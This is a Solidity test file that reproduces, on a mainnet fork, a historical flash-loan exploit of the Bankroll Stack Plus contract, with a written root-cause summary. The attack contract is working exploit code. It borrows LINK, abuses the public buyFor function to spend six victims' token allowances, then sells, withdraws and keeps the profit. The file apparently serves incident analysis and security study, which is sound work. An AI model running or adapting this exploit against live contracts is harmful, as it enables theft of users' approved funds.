// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12,234.48 USD
// Attacker : 0x172dcA3e72E4643ce8B7932f4947347C1E49ba6D
// Attack Contract : 0x92c56DD0c9EEE1Da9f68F6E0F70C4A77de7B2b3c
// Vulnerable Contract : 0x7B3611B0afFC27d212A68293831d3B55354B802f
// Attack Tx : https://etherscan.io/tx/0x8905a0aca5849626c0de026c2d2894ddfa8060a27725221f01aac9fb0b3d6629
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x7B3611B0afFC27d212A68293831d3B55354B802f#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1301
//
// Attack summary: the attacker used flash-sourced LINK to buy Bankroll Stack Plus shares, then called the
// public buyFor(address,uint256) function against accounts that had pre-approved the Bankroll contract.
// Those forced buys injected more LINK and fee accounting into the pool before the attacker sold and withdrew.
// Root cause: buyFor lets any caller spend a third party's token allowance and mutate pool accounting for that
// third party, enabling an attacker to combine victim allowances with a same-transaction buy/sell cycle.

address constant ATTACKER = 0x172Dca3e72e4643cE8B7932F4947347C1e49bA6d;
address constant HISTORICAL_ATTACK_CONTRACT = 0x92C56dD0c9Eee1Da9f68f6e0F70C4a77dE7B2b3C;
address constant BANKROLL_STACK_PLUS = 0x7B3611b0AfFc27D212A68293831d3B55354B802F;
address constant UNISWAP_V4_POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;
address constant UNISWAP_V2_ROUTER = 0xf164fC0Ec4E93095b804a4795bBe1e041497b92a;
address constant LINK_TOKEN = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant FLASH_LINK_AMOUNT = 13_635 ether;
uint256 constant LINK_TO_WETH_SWAP_AMOUNT = 7_800 ether;
uint256 constant ATTACKER_BUY_AMOUNT = 5_835 ether;

interface IBankrollStackPlus {
    function buy(
        uint256 buyAmount
    ) external returns (uint256);
    function buyFor(address customer, uint256 buyAmount) external returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(
        uint256 amountOfTokens
    ) external;
    function withdraw() external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ContractTest is BaseTestWithBalanceLog {
    address[6] private buyers = [
        0x24DD493Af24Abc8E1c27A1592E4CCfa55D4aA4bD,
        0x52ecc67bcaFF974728160EAcB70eED1945D1C94F,
        0x6bfe931216d69AA1884FC76192490db5b0f82660,
        0xD039424B9aA1833859c2a8338902853B1FC32203,
        0xf22a6502a60B0758A5d7d702990e88086Ea14C9B,
        0xF6D44482c95190cAeBb37b31CaF57cf6b5315Bd1
    ];

    uint256[6] private buyAmounts = [
        88_296987564707074262,
        7_600000000000000000,
        547_016590000000000000,
        725278500000000000,
        39_500000000000000000,
        135_883166404073800795
    ];

    function setUp() public {
        uint256 forkBlock = 22_734_354;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = LINK_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(BANKROLL_STACK_PLUS, "Bankroll Stack Plus");
        vm.label(UNISWAP_V4_POOL_MANAGER, "Uniswap V4 PoolManager");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
        vm.label(LINK_TOKEN, "LINK");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerLinkBefore = IERC20(LINK_TOKEN).balanceOf(ATTACKER);
        uint256 poolManagerLinkBefore = IERC20(LINK_TOKEN).balanceOf(UNISWAP_V4_POOL_MANAGER);

        assertGe(poolManagerLinkBefore, FLASH_LINK_AMOUNT);
        for (uint256 i; i < buyers.length; ++i) {
            assertGe(IERC20(LINK_TOKEN).balanceOf(buyers[i]), buyAmounts[i]);
            assertGe(IERC20(LINK_TOKEN).allowance(buyers[i], BANKROLL_STACK_PLUS), buyAmounts[i]);
        }

        BankrollStackPlusAttack attack = new BankrollStackPlusAttack(ATTACKER, buyers, buyAmounts);

        // step 1: model the historical Uniswap V4 PoolManager take() as same-transaction flash capital.
        vm.prank(UNISWAP_V4_POOL_MANAGER);
        IERC20(LINK_TOKEN).transfer(address(attack), FLASH_LINK_AMOUNT);

        attack.execute();

        uint256 attackerProfit = IERC20(LINK_TOKEN).balanceOf(ATTACKER) - attackerLinkBefore;
        assertGt(attackerProfit, 900 ether);
        assertEq(IERC20(LINK_TOKEN).balanceOf(UNISWAP_V4_POOL_MANAGER), poolManagerLinkBefore);
    }
}

contract BankrollStackPlusAttack {
    address private immutable profitReceiver;
    address[6] private buyers;
    uint256[6] private buyAmounts;

    constructor(address receiver, address[6] memory victims, uint256[6] memory amounts) {
        profitReceiver = receiver;
        buyers = victims;
        buyAmounts = amounts;

        IERC20(LINK_TOKEN).approve(BANKROLL_STACK_PLUS, type(uint256).max);
        IERC20(LINK_TOKEN).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        IERC20(WETH_TOKEN).approve(UNISWAP_V2_ROUTER, type(uint256).max);
    }

    function execute() external {
        address[] memory linkToWeth = new address[](2);
        linkToWeth[0] = LINK_TOKEN;
        linkToWeth[1] = WETH_TOKEN;

        // step 2: swap part of the flash LINK to WETH, matching the historical setup for the later repayment swap.
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            LINK_TO_WETH_SWAP_AMOUNT, 1, linkToWeth, address(this), block.timestamp + 1 hours
        );

        // step 3: buy attacker shares, then force third-party buys through existing LINK allowances.
        IBankrollStackPlus(BANKROLL_STACK_PLUS).buy(ATTACKER_BUY_AMOUNT);
        for (uint256 i; i < buyers.length; ++i) {
            IBankrollStackPlus(BANKROLL_STACK_PLUS).buyFor(buyers[i], buyAmounts[i]);
        }

        // step 4: sell attacker shares and withdraw the boosted dividend balance.
        uint256 shares = IBankrollStackPlus(BANKROLL_STACK_PLUS).myTokens();
        IBankrollStackPlus(BANKROLL_STACK_PLUS).sell(shares);
        IBankrollStackPlus(BANKROLL_STACK_PLUS).withdraw();

        address[] memory wethToLink = new address[](2);
        wethToLink[0] = WETH_TOKEN;
        wethToLink[1] = LINK_TOKEN;

        uint256 wethBalance = IERC20(WETH_TOKEN).balanceOf(address(this));
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            wethBalance, 1, wethToLink, address(this), block.timestamp + 1 hours
        );

        // step 5: repay the flash source and keep the remaining LINK profit.
        IERC20(LINK_TOKEN).transfer(UNISWAP_V4_POOL_MANAGER, FLASH_LINK_AMOUNT);
        IERC20(LINK_TOKEN).transfer(profitReceiver, IERC20(LINK_TOKEN).balanceOf(address(this)));
    }
}
